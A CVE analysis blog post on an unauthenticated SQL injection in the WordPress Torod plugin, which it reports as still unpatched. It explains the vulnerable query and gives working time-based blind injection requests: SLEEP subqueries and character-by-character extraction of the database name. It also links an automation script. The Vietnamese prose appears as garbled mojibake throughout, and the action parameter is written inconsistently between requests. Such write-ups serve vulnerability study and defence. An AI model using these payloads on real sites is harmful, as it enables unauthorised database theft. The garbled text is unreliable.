---
title: CVE-2025-30936 
description: Security Vulnerability in WordPress Torod Plugin.
date: 2025-09-10 00:01:00 +0700
categories: [Vulnerabilities, CVE Analyst]
tags: [analyst, plugin, sqli]
---

## Introduction
L·ªó h·ªïng x·∫£y ra tr√™n plugin **Torod** c·ªßa WordPress. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.
- **CVE ID**: [CVE-2025-30936](https://www.cve.org/CVERecord?id=CVE-2025-30936)
- **Product**: [WordPress Torod Plugin](https://wordpress.org/plugins/torod/)
- **Vulnerability Type**: SQL Injection  
- **Affected Versions**: <= 1.9 
- **Fixed in**: <= N/A 
- **CVSS severity**:  High (9.3) 
- **Required Privilege**: Unauthenticated

## Requirements
- [**Local WordPress and Debugging**](https://w41bu1.github.io/posts/wordpress-local-and-debugging/)
- **Torod**: v1.9

## Analysis
Nguy√™n nh√¢n c·ªë l√µi do ·ª©ng d·ª•ng ch√®n tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ **POST** request v√†o SQL query m√† kh√¥ng c√≥ c∆° ch·∫ø qu·∫£n ki·ªÉm so√°t ch·∫∑t ch·∫Ω.

### Vulnerable Sink
CVE n√†y kh√¥ng c√≥ b·∫£n v√° n√™n kh√¥ng th·ªÉ s·ª≠ d·ª•ng **diff tool** ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa **code l·ªói** v√† **code ƒë√£ fix l·ªói**.

> Trong WordPress, ƒë·ªÉ SQLi x·∫£y ra, ·ª©ng d·ª•ng ph·∫£i t∆∞∆°ng t√°c v·ªõi database th√¥ng qua bi·∫øn global `$wpdb`, ta search t·ª´ kh√≥a n√†y trong th∆∞ m·ª•c c·ªßa plugin ƒë·ªÉ t√¨m sink. 
{: .prompt-tip }

![Search sink](assets/img/posts/2025-09-10-CVE-2025-30936/search_sink.png)

üëâ D·ªØ li·ªáu t·ª´ `$_POST['country_id']` ƒë∆∞·ª£c ƒë∆∞a th·∫≥ng v√†o truy v·∫•n SQL m√† kh√¥ng c√≥ c∆° ch·∫ø ki·ªÉm so√°t h·ª£p l·ªá. Vi·ªác ch·ªâ s·ª≠ d·ª•ng `sanitize_text_field()` m·ªõi d·ª´ng l·∫°i ·ªü m·ª©c **escape chu·ªói**, ch·ª© kh√¥ng ƒë·∫£m b·∫£o t√≠nh an to√†n. Do ƒë√≥, l·ªó h·ªïng SQLi c√≥ th·ªÉ x·∫£y ra.

- Source: `$_POST['country_id']`
- Sink: `$wpdb->get_results("SELECT * FROM $table_name WHERE country_id = $country_id")`

### How it work?
L·ªó h·ªïng n·∫±m trong h√†m `get_regions_and_cities` c·ªßa class `ajaxyk` thu·ªôc file **inc/ajaxyk.php**. ƒê·ªÉ x√°c ƒë·ªãnh n∆°i n√≥ ƒë∆∞·ª£c g·ªçi, ta t√¨m ki·∫øm v·ªõi t·ª´ kh√≥a `get_regions_and_cities` trong th∆∞ m·ª•c ch·ª©a plugin.

![Search 1](assets/img/posts/2025-09-10-CVE-2025-30936/search_1.png)

üëâ `get_regions_and_cities` ƒë∆∞·ª£c construct c·ªßa class `ajaxyk` g·ªçi l√†m callback c·ªßa 2 action hook th√¥ng qua h√†m `add_action`

- `wp_ajax_get_regions_and_cities`
    - ƒê∆∞·ª£c vi·∫øt theo c√∫ ph√°p `wp_ajax_{$action}`
    - Y√™u c·∫ßu ng∆∞·ªùi d√πng ƒëƒÉng nh·∫≠p

- `wp_ajax_nopriv_get_regions_and_cities` 
    - ƒê∆∞·ª£c vi·∫øt theo c√∫ ph√°p `wp_ajax_nopriv_{$action}`
    - Kh√¥ng y√™u c·∫ßu ng∆∞·ªùi d√πng ƒëƒÉng nh·∫≠p

V√¨ ƒë√¢y l√† l·ªó h·ªïng **unauthenticated** n√™n ta ch·ªâ quan t√¢m t·ªõi hook `wp_ajax_nopriv_get_regions_and_cities`.

Nh∆∞ v·∫≠y khi g·ª≠i **POST** request ƒë·∫øn `/wp-admin/admin-ajax.php` v·ªõi tham s·ªë

```
action=wp_ajax_nopriv_get_regions_and_cities&country_id=payload_here:
```

- Callback `get_regions_and_cities` ƒë∆∞·ª£c g·ªçi.
- `country_id` ƒë∆∞·ª£c l·∫•y tr·ª±c ti·∫øp t·ª´ request v√† ch√®n v√†o SQL query.
- Query th·ª±c thi v·ªõi payload ƒë·ªôc h·∫°i.

## Exploit
### Detect SQLi

G·ª≠i **POST request** ch·ª©a payload SQLi.

```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: localhost
...
Cookie: cookie_here

action=get_regions_and_cities&country_id=(SELECT 1 FROM (SELECT SLEEP(5))a)
```

Khi ƒë√≥ c√¢u query s·∫Ω tr·ªü th√†nh:

```sql
SELECT * FROM wp_torod_regions WHERE country_id = (SELECT 1 FROM (SELECT SLEEP(5))a)
```

![Responsed time](assets/img/posts/2025-09-10-CVE-2025-30936/time_resp.png)

üëâ D·ª±a tr√™n th·ªùi gian ph·∫£n h·ªìi => payload ho·∫°t ƒë·ªông.

**C√°c technique c√≥ th·ªÉ s·ª≠ d·ª•ng trong tr∆∞·ªùng h·ª£p table r·ªóng**:

- **UNION**: v√¨ n√≥ kh√¥ng ph·ª• thu·ªôc v√†o d·ªØ li·ªáu b·∫£ng c·ªßa c√¢u query tr∆∞·ªõc ƒë√≥, nh∆∞ng c·∫ßn ph·∫£i t√¨m ƒë∆∞·ª£c s·ªë c·ªôt t∆∞∆°ng ·ª©ng.
- **Subquery**:
    - **Subquery trong m·ªánh ƒë·ªÅ WHERE**: MySQL c√≥ th·ªÉ t·ªëi ∆∞u h√≥a v√† b·ªè qua subquery n·∫øu k·∫øt qu·∫£ c√≥ th·ªÉ x√°c ƒë·ªãnh s·ªõm. N·∫øu b·∫£ng kh√¥ng c√≥ d·ªØ li·ªáu, k·∫øt qu·∫£ cu·ªëi c√πng s·∫Ω l√† t·∫≠p r·ªóng, MySQL kh√¥ng c·∫ßn th·ª±c thi `SLEEP()`.
    - **Subquery trong m·ªánh ƒë·ªÅ FROM**: Truy v·∫•n con ƒë∆∞·ª£c coi l√† b·∫£ng t·∫°m th·ªùi. MySQL ph·∫£i th·ª±c thi truy v·∫•n con n√†y ƒë·∫ßu ti√™n ƒë·ªÉ t·∫°o b·∫£ng t·∫°m th·ªùi, sau ƒë√≥ m·ªõi th·ª±c thi truy v·∫•n ch√≠nh. 

![SQL Excution Order](https://www.kdnuggets.com/wp-content/uploads/ferrer_essential_guide_sql_execution_order_6.png)

### Get First Letter of Database Name

ƒêi·ªÅu ki·ªán ti√™n quy·∫øt ƒë·ªÉ **dump ƒë∆∞·ª£c h·∫øt data** l√† ph·∫£i dump ƒë∆∞·ª£c 1 k√Ω t·ª± b·∫•t k·ª≥ c·ªßa t√™n database, n·∫øu l·∫•y ƒë∆∞·ª£c th√¨ g·∫ßn nh∆∞ to√†n b·ªô data ƒë·ªÅu dump ƒë∆∞·ª£c.

G·ª≠i request v·ªõi **SQLi payload**:

```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: localhost
...
Cookie: cookie_here

action=get_regions_and_cities=1&country_id=(SELECT 1 FROM (SELECT IF(SUBSTRING(SCHEMA(),1,1)=0x77, SLEEP(5), 1))a)
```

S·ª≠ d·ª•ng `SUBSTRING()` ƒë·ªÉ l·∫•y k√Ω t·ª± ƒë·∫ßu ti√™n c·ªßa **database name**, `IF()` tr·∫£ v·ªÅ `SLEEP(5)` n·∫øu k√Ω t·ª± ƒë√≥ l√† `0x77`('w')

S·ª≠ d·ª•ng hex encoding `w` th√†nh `0x77` v√¨ `country_id` ƒë∆∞·ª£c l·∫•y t·ª´ **POST** request trong n√™n b·ªã escape b·ªüi [magic quotes](https://patchstack.com/academy/wordpress/vulnerabilities/sql-injection/#magic-quotes) trong WordPress v√† b·ªüi `sanitize_text_field`.

üëâ D·ª±a tr√™n th·ªùi gian ph·∫£n h·ªìi => k√≠ t·ª± ƒë·∫ßu ti√™n ƒë√∫ng l√† `w`.

D·ª±a tr√™n kƒ© thu·∫≠t **Timebased SQLi** ta vi·∫øt script ƒë·ªÉ t·ª± ƒë·ªông khai th√°c.

[Script here](https://github.com/w41bu1/w41bu1.github.io/blob/main/assets/code/posts/2025-09-10-CVE-2025-30936/script.py)

## Conclusion
L·ªó h·ªïng **CVE-2025-30936** trong plugin WordPress **Torod** t·ª´ phi√™n b·∫£n **1.9** tr·ªü l·∫°i, xu·∫•t ph√°t t·ª´ vi·ªác truy·ªÅn tr·ª±c ti·∫øp input t·ª´ ng∆∞·ªùi d√πng v√†o SQL query m√† kh√¥ng c√≥ bi·ªán ph√°p ki·ªÉm so√°t ch·∫∑t ch·∫Ω d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.

Ch∆∞a c√≥ b·∫£n v√° ch√≠nh th·ª±c n√†o cho l·ªó h·ªïng n√†y.

**Key takeaways**:
- Ki·ªÉm so√°t k·ªπ input t·ª´ ng∆∞·ªùi d√πng.
- Lu√¥n s·ª≠ d·ª•ng `$wpdb->prepare()` khi l√†m vi·ªác v·ªõi database trong WordPress ƒë·ªÉ tr√°nh SQL Injection.
- Th∆∞·ªùng xuy√™n c·∫≠p nh·∫≠t plugin v√† ki·ªÉm tra b·∫£o m·∫≠t ƒë·ªÉ tr√°nh tr·ªü th√†nh m·ª•c ti√™u t·∫•n c√¥ng.

## References

[SQL Injection cheat sheet - PortSwigger](https://portswigger.net/web-security/sql-injection/cheat-sheet)

[WordPress Torod Plugin <= 1.9 is vulnerable to SQL Injection](https://patchstack.com/database/wordpress/plugin/torod/vulnerability/wordpress-torod-1-9-sql-injection-vulnerability?_s_id=cve)